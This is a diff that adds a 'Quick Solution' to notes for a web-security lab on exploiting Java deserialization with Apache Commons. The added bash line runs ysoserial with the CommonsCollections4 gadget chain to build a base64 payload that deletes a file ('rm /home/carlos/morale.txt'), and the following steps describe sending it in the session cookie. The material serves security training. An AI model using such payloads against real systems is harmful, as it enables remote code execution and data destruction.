@@ -98,6 +98,13 @@ class CustomTemplate {
 
 Lab: Exploiting Java deserialization with Apache Commons
 
+Quick Solution (in Java version 16 and above):
+```bash
+java --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED --add-opens=java.base/java.net=ALL-UNNAMED --add-opens=java.base/java.util=ALL-UNNAMED -jar ysoserial-all.jar "CommonsCollections4" 'rm /home/carlos/morale.txt' | base64 -w 0
+```
+
+Solution:
+
     Log in to your own account and observe that the session cookie contains a serialized Java object. Send a request containing your session cookie to Burp Repeater.
 
     Download the "ysoserial" tool and execute the following command. This generates a Base64-encoded serialized object containing your payload:
